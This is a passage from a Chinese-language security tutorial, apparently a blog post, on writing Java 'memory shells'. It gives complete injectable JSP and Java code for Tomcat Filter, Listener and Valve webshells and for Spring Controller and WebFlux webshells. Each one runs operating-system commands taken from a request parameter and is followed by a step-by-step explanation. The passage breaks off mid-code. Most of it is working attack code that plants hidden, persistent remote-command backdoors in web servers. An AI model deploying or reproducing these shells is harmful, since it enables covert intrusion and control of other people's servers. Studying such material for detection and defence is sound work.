ServletContext是Servlet规范；org.apache.catalina.core.ApplicationContext是ServletContext的实现；org.apache.catalina.Context接口是tomcat容器结构中的一种容器，代表的是一个web应用程序，是tomcat独有的，其标准实现是org.apache.catalina.core.StandardContext，是tomcat容器的重要组成部分。 关于StandardContext的获取方法，除了本文中提到的将我们的ServletContext转为StandardContext从而获取context这个方法，还有以下两种方法： 从线程中获取StandardContext，参考Litch1师傅的文章：https://mp.weixin.qq.com/s/O9Qy0xMen8ufc3ecC33z6A 从MBean中获取，参考54simo师傅的文章：https://scriptboy.cn/p/tomcat-filter-inject/，不过这位师傅的博客已经关闭了，我们可以看存档：https://web.archive.org/web/20211027223514/https://scriptboy.cn/p/tomcat-filter-inject/ 从spring运行时的上下文中获取，参考 LandGrey@奇安信观星实验室 师傅的文章：https://www.anquanke.com/post/id/198886 这两种方法，如果后面有时间的话我会补充完整。 3.2 Filter内存马3.2.1 简单的filter内存马demo编写根据我们在上面的2.6节中所讨论的内容，我们可以得出以下结论： 如果我们想要写一个Filter内存马，需要经过以下步骤： 参考：https://longlone.top/安全/java/java安全/内存马/Tomcat-Filter型/ 获取StandardContext； 继承并编写一个恶意filter； 实例化一个FilterDef类，包装filter并存放到StandardContext.filterDefs中； 实例化一个FilterMap类，将我们的Filter和urlpattern相对应，使用addFilterMapBefore存放到StandardContext.filterMaps中； 通过反射获取filterConfigs，实例化一个FilterConfig（ApplicationFilterConfig）类，传入StandardContext与filterDefs，存放到filterConfig中。 参考：https://tyaoo.github.io/2021/12/06/Tomcat内存马/ 需要注意的是，一定要先修改filterDef，再修改filterMap，不然会抛出找不到filterName的异常。 由以上结论我们可以写出如下内存马demo： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109&lt;%@ page import=&quot;java.lang.reflect.*&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;java.util.Map&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.Context&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import=&quot;java.io.*&quot; %&gt;&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;&lt;%@ page import=&quot;java.util.List&quot; %&gt;&lt;%@ page import=&quot;java.util.ArrayList&quot; %&gt;&lt;% ServletContext servletContext = request.getSession().getServletContext(); Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); Field filterConfigsField = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;); filterConfigsField.setAccessible(true); Map filterConfigs = (Map) filterConfigsField.get(standardContext); String filterName = getRandomString(); if (filterConfigs.get(filterName) == null) { Filter filter = new Filter() { @Override public void init(FilterConfig filterConfig) { } @Override public void destroy() { } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest; String cmd = httpServletRequest.getParameter(&quot;cmd&quot;); { InputStream in = Runtime.getRuntime().exec(&quot;cmd /c &quot; + cmd).getInputStream(); Scanner s = new Scanner(in, &quot;GBK&quot;).useDelimiter(&quot;\\\\A&quot;); String output = s.hasNext() ? s.next() : &quot;&quot;; servletResponse.setCharacterEncoding(&quot;GBK&quot;); PrintWriter out = servletResponse.getWriter(); out.println(output); out.flush(); out.close(); } filterChain.doFilter(servletRequest, servletResponse); } }; FilterDef filterDef = new FilterDef(); filterDef.setFilterName(filterName); filterDef.setFilterClass(filter.getClass().getName()); filterDef.setFilter(filter); standardContext.addFilterDef(filterDef); FilterMap filterMap = new FilterMap(); filterMap.setFilterName(filterName); filterMap.addURLPattern(&quot;/*&quot;); filterMap.setDispatcher(DispatcherType.REQUEST.name()); standardContext.addFilterMapBefore(filterMap); Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class); constructor.setAccessible(true); ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef); filterConfigs.put(filterName, applicationFilterConfig); out.print(&quot;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Malicious filter injection successful!&lt;br&gt;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Filter name: &quot; + filterName + &quot;&lt;br&gt;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Below is a list displaying filter names and their corresponding URL patterns:&quot;); out.println(&quot;&lt;table border='1'&gt;&quot;); out.println(&quot;&lt;tr&gt;&lt;th&gt;Filter Name&lt;/th&gt;&lt;th&gt;URL Patterns&lt;/th&gt;&lt;/tr&gt;&quot;); List&lt;String[]&gt; allUrlPatterns = new ArrayList&lt;&gt;(); for (Object filterConfigObj : filterConfigs.values()) { if (filterConfigObj instanceof ApplicationFilterConfig) { ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) filterConfigObj; String filtername = filterConfig.getFilterName(); FilterDef filterdef = standardContext.findFilterDef(filtername); if (filterdef != null) { FilterMap[] filterMaps = standardContext.findFilterMaps(); for (FilterMap filtermap : filterMaps) { if (filtermap.getFilterName().equals(filtername)) { String[] urlPatterns = filtermap.getURLPatterns(); allUrlPatterns.add(urlPatterns); // 将当前迭代的urlPatterns添加到列表中 out.println(&quot;&lt;tr&gt;&lt;td&gt;&quot; + filtername + &quot;&lt;/td&gt;&quot;); out.println(&quot;&lt;td&gt;&quot; + String.join(&quot;, &quot;, urlPatterns) + &quot;&lt;/td&gt;&lt;/tr&gt;&quot;); } } } } } out.println(&quot;&lt;/table&gt;&quot;); for (String[] urlPatterns : allUrlPatterns) { for (String pattern : urlPatterns) { if (!pattern.equals(&quot;/*&quot;)) { out.println(&quot;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;shell: http://localhost:8080/test&quot; + pattern + &quot;?cmd=ipconfig&lt;br&gt;&quot;); } } } }%&gt;&lt;%! private String getRandomString() { String characters = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; StringBuilder randomString = new StringBuilder(); for (int i = 0; i &lt; 8; i++) { int index = (int) (Math.random() * characters.length()); randomString.append(characters.charAt(index)); } return randomString.toString(); }%&gt; 效果如下： 同样的，这里我也适配了中文编码，和一些提示性语句的输出。 3.2.2 servlet内存马demo代码分析我们分开来分析，首先看这段代码： 12345678910ServletContext servletContext = request.getSession().getServletContext();Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);appctx.setAccessible(true);ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);stdctx.setAccessible(true);StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);Field filterConfigsField = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);filterConfigsField.setAccessible(true);Map filterConfigs = (Map) filterConfigsField.get(standardContext); 先是获取当前的servlet上下文并拿到其私有字段context，然后设置可访问，这样就可以通过反射这个context字段的值，这个值是一个ApplicationContext对象；接着获取ApplicationContext的私有字段context并设置可访问，然后通过反射获取ApplicationContext的context字段的值，这个值是一个StandardContext对象；最后是获取StandardContext的私有字段filterConfigs，设置可访问之后通过反射获取StandardContext的filterConfigs字段的值。 中间的构造匿名类的部分就不说了，和之前的Servlet是很像的，别忘记最后的filterChain.doFilter就行。 然后是这段代码： 1234567891011121314FilterDef filterDef = new FilterDef();filterDef.setFilterName(filterName);filterDef.setFilterClass(filter.getClass().getName());filterDef.setFilter(filter);standardContext.addFilterDef(filterDef);FilterMap filterMap = new FilterMap();filterMap.setFilterName(filterName);filterMap.addURLPattern(&quot;/*&quot;);filterMap.setDispatcher(DispatcherType.REQUEST.name());standardContext.addFilterMapBefore(filterMap);Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);constructor.setAccessible(true);ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);filterConfigs.put(filterName, applicationFilterConfig); 也就是定义我们自己的filterDef和FilterMap并加入到srandardContext中，接着反射获取 ApplicationFilterConfig 类的构造函数并将构造函数设置为可访问，然后创建了一个 ApplicationFilterConfig 对象的实例，接着将刚刚创建的实例添加到过滤器配置的 Map 中，filterName 为键，这样就可以将动态创建的过滤器配置信息加入应用程序的全局配置中。 需要注意的是，在tomcat 7及以前FilterDef和FilterMap这两个类所属的包名是： 12&lt;%@ page import=&quot;org.apache.catalina.deploy.FilterMap&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.deploy.FilterDef&quot; %&gt; tomcat 8及以后，包名是这样的： 12&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt; 由于这方面的区别，最好是直接都用反射去写这个filter内存马，具体demo参考： https://github.com/feihong-cs/memShell/blob/master/src/main/java/com/memshell/tomcat/FilterBasedWithoutRequestVariant.java 还有个需要注意的点就是，我给出的这个demo代码只适用于tomcat 7及以上，因为 filterMap.setDispatcher(DispatcherType.REQUEST.name());这行代码中用到的DispatcherType是在Servlet 3.0规范中才有的。 3.2.3 tomcat6下filter内存马的编写这里直接贴出参考文章，后面有空的话，会在我的博客中补全这部分的研究： https://xz.aliyun.com/t/9914 https://mp.weixin.qq.com/s/sAVh3BLYNHShKwg3b7WZlQ https://www.cnblogs.com/CoLo/p/16840371.html https://flowerwind.github.io/2021/10/11/tomcat6、7、8、9内存马/ https://9bie.org/index.php/archives/960/ https://github.com/xiaopan233/GenerateNoHard https://github.com/ax1sX/MemShell/tree/main/TomcatMemShell 3.3 Listener内存马3.3.1 简单的Listener内存马demo编写根据我们在上面的2.9节中所讨论的内容，我们可以得出以下结论： 如果我们想要写一个Listener内存马，需要经过以下步骤： 继承并编写一个恶意Listener 获取StandardContext 调用StandardContext.addApplicationEventListener()添加恶意Listener 由以上结论我们可以写出如下内存马demo： 1234567891011121314151617181920212223242526272829303132333435363738&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;&lt;%! public class EvilListener implements ServletRequestListener { public void requestDestroyed(ServletRequestEvent sre) { HttpServletRequest req = (HttpServletRequest) sre.getServletRequest(); if (req.getParameter(&quot;cmd&quot;) != null){ InputStream in = null; try { in = Runtime.getRuntime().exec(new String[]{&quot;cmd.exe&quot;,&quot;/c&quot;,req.getParameter(&quot;cmd&quot;)}).getInputStream(); Scanner s = new Scanner(in, &quot;GBK&quot;).useDelimiter(&quot;\\\\A&quot;); String out = s.hasNext()?s.next():&quot;&quot;; Field requestF = req.getClass().getDeclaredField(&quot;request&quot;); requestF.setAccessible(true); Request request = (Request)requestF.get(req); request.getResponse().setCharacterEncoding(&quot;GBK&quot;); request.getResponse().getWriter().write(out); } catch (Exception ignored) {} } } public void requestInitialized(ServletRequestEvent sre) {} }%&gt;&lt;% Field reqF = request.getClass().getDeclaredField(&quot;request&quot;); reqF.setAccessible(true); Request req = (Request) reqF.get(request); StandardContext context = (StandardContext) req.getContext(); EvilListener evilListener = new EvilListener(); context.addApplicationEventListener(evilListener); out.println(&quot;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Inject Listener Memory Shell successfully!&lt;br&gt;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Shell url: http://localhost:8080/test/?cmd=ipconfig&quot;);%&gt; 效果如下： 3.3.2 Listener内存马demo代码分析最关键部分的代码如下： 123456Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);reqF.setAccessible(true);Request req = (Request) reqF.get(request);StandardContext context = (StandardContext) req.getContext();EvilListener evilListener = new EvilListener();context.addApplicationEventListener(evilListener); 前面四行代码干一件事：获取StandardContext；后两行干代码干这两件事：实例化我们编写的恶意Listener，调用addApplicationEventListener方法加入到applicationEventListenersList中去，这样最终就会到eventListener。 四、Spring MVC框架型内存马4.1 Spring Controller型内存马4.1.1 简单的Spring Controller型内存马demo编写由2.11.2.2节中的分析可知，要编写一个spring controller型内存马，需要经过以下步骤： 获取WebApplicationContext 获取RequestMappingHandlerMapping实例 通过反射获得自定义Controller的恶意方法的Method对象 定义RequestMappingInfo 动态注册Controller 代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970package org.example.springcontrollermemoryshellexample.demos.web;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.context.request.ServletRequestAttributes;import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;import org.springframework.web.servlet.mvc.method.RequestMappingInfo;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.InputStream;import java.lang.reflect.Method;import java.util.Scanner;@RestControllerpublic class TestEvilController { private String getRandomString() { String characters = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; StringBuilder randomString = new StringBuilder(); for (int i = 0; i &lt; 8; i++) { int index = (int) (Math.random() * characters.length()); randomString.append(characters.charAt(index)); } return randomString.toString(); } @RequestMapping(&quot;/inject&quot;) public String inject() throws Exception{ String controllerName = &quot;/&quot; + getRandomString(); WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0); RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); Method method = InjectedController.class.getMethod(&quot;cmd&quot;); PatternsRequestCondition urlPattern = new PatternsRequestCondition(controllerName); RequestMethodsRequestCondition condition = new RequestMethodsRequestCondition(); RequestMappingInfo info = new RequestMappingInfo(urlPattern, condition, null, null, null, null, null); InjectedController injectedController = new InjectedController(); requestMappingHandlerMapping.registerMapping(info, injectedController, method); return &quot;[+] Inject successfully!&lt;br&gt;[+] shell url: http://localhost:8080&quot; + controllerName + &quot;?cmd=ipconfig&quot;; } @RestController public static class InjectedController { public InjectedController(){ } public void cmd() throws Exception { HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest(); HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse(); response.setCharacterEncoding(&quot;GBK&quot;); if (request.getParameter(&quot;cmd&quot;) != null) { boolean isLinux = true; String osTyp = System.getProperty(&quot;os.name&quot;); if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) { isLinux = false; } String[] cmds = isLinux ? new String[]{&quot;sh&quot;, &quot;-c&quot;, request.getParameter(&quot;cmd&quot;)} : new String[]{&quot;cmd.exe&quot;, &quot;/c&quot;, request.getParameter(&quot;cmd&quot;)}; InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner s = new Scanner(in, &quot;GBK&quot;).useDelimiter(&quot;\\\\A&quot;); String output = s.hasNext() ? s.next() : &quot;&quot;; response.getWriter().write(output); response.getWriter().flush(); response.getWriter().close(); } } }} 运行效果： 4.1.2 Spring Controller型内存马demo代码分析代码的关键在于如下这几行： 12345678WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);Method method = InjectedController.class.getMethod(&quot;cmd&quot;);PatternsRequestCondition urlPattern = new PatternsRequestCondition(controllerName);RequestMethodsRequestCondition condition = new RequestMethodsRequestCondition();RequestMappingInfo info = new RequestMappingInfo(urlPattern, condition, null, null, null, null, null);InjectedController injectedController = new InjectedController();requestMappingHandlerMapping.registerMapping(info, injectedController, method); 这段代码先利用RequestContextHolder获取当前请求的WebApplicationContext，这个RequestContextHolder是Spring框架提供的用于存储和访问请求相关信息的工具类；接着从上一步中获取到的WebApplicationContext中获取RequestMappingHandlerMapping Bean；接着通过反射获得我们自定义Controller的恶意方法的Method对象，然后就是拿到对应的RequestMappingInfo对象；通过bean实例+处理请求的method+对应的RequestMappinginfo对象即可调用registerMapping方法动态添加恶意controller。 4.2 Spring Interceptor型内存马由2.11.2.3节的分析我们很容易得出Spring Interceptor型内存马的编写思路： 获取ApplicationContext 通过AbstractHandlerMapping反射来获取adaptedInterceptors 将要注入的恶意拦截器放入到adaptedInterceptors中 具体代码我会放到针对实际中间件打内存马那里。 4.3 Spring WebFlux内存马4.3.1 简单的Spring WebFlux内存马demo编写由2.12.5节的分析我们可以写出下面的代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117package org.example.webfluxmemoryshelldemo.memoryshell;import org.springframework.boot.web.embedded.netty.NettyWebServer;import org.springframework.context.annotation.Configuration;import org.springframework.core.io.buffer.DataBuffer;import org.springframework.core.io.buffer.DefaultDataBufferFactory;import org.springframework.http.MediaType;import org.springframework.http.server.reactive.ReactorHttpHandlerAdapter;import org.springframework.http.server.reactive.ServerHttpRequest;import org.springframework.http.server.reactive.ServerHttpResponse;import org.springframework.web.server.ServerWebExchange;import org.springframework.web.server.WebFilter;import org.springframework.web.server.WebFilterChain;import org.springframework.web.server.WebHandler;import org.springframework.web.server.adapter.HttpWebHandlerAdapter;import org.springframework.web.server.handler.DefaultWebFilterChain;import org.springframework.web.server.handler.ExceptionHandlingWebHandler;import org.springframework.web.server.handler.FilteringWebHandler;import reactor.core.publisher.Flux;import reactor.core.publisher.Mono;import java.io.BufferedReader;import java.io.IOException;import java.io.InputStreamReader;import java.lang.reflect.Array;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.lang.reflect.Modifier;import java.nio.charset.StandardCharsets;import java.util.ArrayList;import java.util.List;@Configurationpublic class MemoryShellFilter implements WebFilter{ public static void doInject() { Method getThreads; try { getThreads = Thread.class.getDeclaredMethod(&quot;getThreads&quot;); getThreads.setAccessible(true); Object threads = getThreads.invoke(null); for (int i = 0; i &lt; Array.getLength(threads); i++) { Object thread = Array.get(threads, i); if (thread != null &amp;&amp; thread.getClass().getName().contains(&quot;NettyWebServer&quot;)) { NettyWebServer nettyWebServer = (NettyWebServer) getFieldValue(thread, &quot;this$0&quot;, false); ReactorHttpHandlerAdapter reactorHttpHandlerAdapter = (ReactorHttpHandlerAdapter) getFieldValue(nettyWebServer, &quot;handler&quot;, false); Object delayedInitializationHttpHandler = getFieldValue(reactorHttpHandlerAdapter,&quot;httpHandler&quot;, false); HttpWebHandlerAdapter httpWebHandlerAdapter = (HttpWebHandlerAdapter) getFieldValue(delayedInitializationHttpHandler,&quot;delegate&quot;, false); ExceptionHandlingWebHandler exceptionHandlingWebHandler = (ExceptionHandlingWebHandler) getFieldValue(httpWebHandlerAdapter,&quot;delegate&quot;, true); FilteringWebHandler filteringWebHandler = (FilteringWebHandler) getFieldValue(exceptionHandlingWebHandler,&quot;delegate&quot;, true); DefaultWebFilterChain defaultWebFilterChain = (DefaultWebFilterChain) getFieldValue(filteringWebHandler,&quot;chain&quot;, false); Object handler = getFieldValue(defaultWebFilterChain, &quot;handler&quot;, false); List&lt;WebFilter&gt; newAllFilters = new ArrayList&lt;&gt;(defaultWebFilterChain.getFilters()); newAllFilters.add(0, new MemoryShellFilter()); DefaultWebFilterChain newChain = new DefaultWebFilterChain((WebHandler) handler, newAllFilters); Field f = filteringWebHandler.getClass().getDeclaredField(&quot;chain&quot;); f.setAccessible(true); Field modifersField = Field.class.getDeclaredField(&quot;modifiers&quot;); modifersField.setAccessible(true); modifersField.setInt(f, f.getModifiers() &amp; ~Modifier.FINAL); f.set(filteringWebHandler, newChain); modifersField.setInt(f, f.getModifiers() &amp; Modifier.FINAL); } } } catch (Exception ignored) {} } public static Object getFieldValue(Object obj, String fieldName,boolean superClass) throws Exception { Field f; if(superClass){ f = obj.getClass().getSuperclass().getDeclaredField(fieldName); }else { f = obj.getClass().getDeclaredField(fieldName); } f.setAccessible(true); return f.get(obj); } public Flux&lt;DataBuffer&gt; getPost(ServerWebExchange exchange) { ServerHttpRequest request = exchange.getRequest(); String path = request.getURI().getPath(); String query = request.getURI().getQuery(); if (path.equals(&quot;/evil/cmd&quot;) &amp;&amp; query != null &amp;&amp; query.startsWith(&quot;command=&quot;)) { String command = query.substring(8); try { Process process = Runtime.getRuntime().exec(&quot;cmd /c&quot; + command); BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream(), &quot;GBK&quot;)); Flux&lt;DataBuffer&gt; response = Flux.create(sink -&gt; { try { String line; while ((line = reader.readLine()) != null) { sink.next(DefaultDataBufferFactory.sharedInstance.wrap(line.getBytes(StandardCharsets.UTF_8))); } sink.complete(); } catch (IOException ignored) {} }); exchange.getResponse().getHeaders().setContentType(MediaType.TEXT_PLAIN); return response; } catch (IOException ignored) {} } return Flux.empty(); } @Override public Mono&lt;Void&gt; filter(ServerWebExchange exchange, WebFilterChain chain) { if (exchange.getRequest().getURI().getPath().startsWith(&quot;/evil/&quot;)) { doInject(); Flux&lt;DataBuffer&gt; response = getPost(exchange); ServerHttpResponse serverHttpResponse = exchange.getResponse(); serverHttpResponse.getHeaders().setContentType(MediaType.TEXT_PLAIN); return serverHttpResponse.writeWith(response); } else { return chain.filter(exchange); } }} 4.3.2 Spring WebFlux内存马demo代码分析从之前的分析我们知道，主要思路就是通过反射找到DefaultWebFilterChain，然后拿到filters，把我们的filter插入到其中的第一位，再用这个filters重新调用公共构造函数DefaultWebFilterChain，赋值给之前分析里面我没看到的this.chain即可。 思路就是这么个思路，我们来看具体的代码。 先是通过反射来获取当前运行的所有线程组，然后遍历线程数组，检查每个线程是否为NettyWebServer实例。如果发现一个线程是NettyWebServer，那就继续下一步的操作。接下来就是找DefaultWebFilterChain对象： 1234567NettyWebServer nettyWebServer = (NettyWebServer) getFieldValue(thread, &quot;this$0&quot;, false);ReactorHttpHandlerAdapter reactorHttpHandlerAdapter = (ReactorHttpHandlerAdapter) getFieldValue(nettyWebServer, &quot;handler&quot;, false);Object delayedInitializationHttpHandler = getFieldValue(reactorHttpHandlerAdapter,&quot;httpHandler&quot;, false);HttpWebHandlerAdapter httpWebHandlerAdapter = (HttpWebHandlerAdapter) getFieldValue(delayedInitializationHttpHandler,&quot;delegate&quot;, false);ExceptionHandlingWebHandler exceptionHandlingWebHandler = (ExceptionHandlingWebHandler) getFieldValue(httpWebHandlerAdapter,&quot;delegate&quot;, true);FilteringWebHandler filteringWebHandler = (FilteringWebHandler) getFieldValue(exceptionHandlingWebHandler,&quot;delegate&quot;, true);DefaultWebFilterChain defaultWebFilterChain = (DefaultWebFilterChain) getFieldValue(filteringWebHandler,&quot;chain&quot;, false); 这条链子在之前的分析中已经提到过，一步步调用我们写的getFieldValue函数即可。 然后就是修改这个过滤器链，添加我们自定义的恶意filter，并把它放到第一位： 1234Object handler = getFieldValue(defaultWebFilterChain, &quot;handler&quot;, false);List&lt;WebFilter&gt; newAllFilters = new ArrayList&lt;&gt;(defaultWebFilterChain.getFilters());newAllFilters.add(0, new MemoryShellFilter());DefaultWebFilterChain newChain = new DefaultWebFilterChain((WebHandler) handler, newAllFilters); 然后通过反射获取FilteringWebHandler的私有字段chain，设置为可访问之后，通过反射将原始的过滤器链替换为新创建的过滤器链newChain，然后恢复字段的可访问权限： 1234567Field f = filteringWebHandler.getClass().getDeclaredField(&quot;chain&quot;);f.setAccessible(true);Field modifersField = Field.class.getDeclaredField(&quot;modifiers&quot;);modifersField.setAccessible(true);modifersField.setInt(f, f.getModifiers() &amp; ~Modifier.FINAL);f.set(filteringWebHandler, newChain);modifersField.setInt(f, f.getModifiers() &amp; Modifier.FINAL); 这里补充一下上面的modifersField.setInt(f, f.getModifiers() &amp; ~Modifier.FINAL);和modifersField.setInt(f, f.getModifiers() &amp; Modifier.FINAL);的含义，第一个代码意思就是使用反射机制，通过modifersField对象来修改字段的修饰符，f.getModifiers()返回字段f的当前修饰符，然后通过位运算&amp; ~Modifier.FINAL，将当前修饰符的FINAL位清除（置为0），表示移除了FINAL修饰符；第二个则是把字段的修饰符重新设置为包含FINAL修饰符的修饰符，这样就可以保持字段的封装性。 五、中间件型内存马5.1 Tomcat Valve型内存马我这里是新建了一个项目，并创建配置好了web目录和tomcat环境，pom.xml中的依赖如下： 1234567&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt; &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt; &lt;version&gt;9.0.83&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 如果idea启动tomcat报错，可以看看是不是你开了网易云哈哈哈： 在web目录下新建一个666.jsp： 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.valves.ValveBase&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.*&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;&lt;%@ page import=&quot;java.io.PrintWriter&quot; %&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;% Field requestField = request.getClass().getDeclaredField(&quot;request&quot;); requestField.setAccessible(true); final Request req = (Request) requestField.get(request); StandardContext standardContext = (StandardContext) req.getContext(); Field pipelineField = ContainerBase.class.getDeclaredField(&quot;pipeline&quot;); pipelineField.setAccessible(true); StandardPipeline evilStandardPipeline = (StandardPipeline) pipelineField.get(standardContext); ValveBase evilValve = new ValveBase() { @Override public void invoke(Request request, Response response) throws ServletException,IOException { if (request.getParameter(&quot;cmd&quot;) != null) { boolean isLinux = true; String osTyp = System.getProperty(&quot;os.name&quot;); if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) { isLinux = false; } String[] cmds = isLinux ? new String[]{&quot;sh&quot;, &quot;-c&quot;, request.getParameter(&quot;cmd&quot;)} : new String[]{&quot;cmd.exe&quot;, &quot;/c&quot;, request.getParameter(&quot;cmd&quot;)}; InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner s = new Scanner(in, &quot;GBK&quot;).useDelimiter(&quot;\\\\A&quot;); String output = s.hasNext() ? s.next() : &quot;&quot;; response.setCharacterEncoding(&quot;GBK&quot;); PrintWriter out = response.getWriter(); out.println(output); out.flush(); out.close(); } this.getNext().invoke(request, response); } }; evilStandardPipeline.addValve(evilValve); out.println(&quot;inject success&quot;);%&gt; 上面的这个是采用了从StandardContext反射获取StandardPipeline的方式，效果如下： 下面的则是调用 standardContext.getPipeline().addValve实现的： 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.valves.ValveBase&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.*&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;&lt;%@ page import=&quot;java.io.PrintWriter&quot; %&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;% class testEvilValve extends ValveBase { @Override public void invoke(Request request, Response response) throws ServletException,IOException { if (request.getParameter(&quot;command&quot;) != null) { boolean isLinux = true; String osTyp = System.getProperty(&quot;os.name&quot;); if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) { isLinux = false; } String[] cmds = isLinux ? new String[]{&quot;sh&quot;, &quot;-c&quot;, request.getParameter(&quot;command&quot;)} : new String[]{&quot;cmd.exe&quot;, &quot;/c&quot;, request.getParameter(&quot;command&quot;)}; InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner s = new Scanner(in, &quot;GBK&quot;).useDelimiter(&quot;\\\\A&quot;); String output = s.hasNext() ? s.next() : &quot;&quot;; response.setCharacterEncoding(&quot;GBK&quot;); PrintWriter out = response.getWriter(); out.println(output); out.flush(); out.close(); } this.getNext().invoke(request, response); } };%&gt;&lt;% Field requestField = request.getClass().getDeclaredField(&quot;request&quot;); 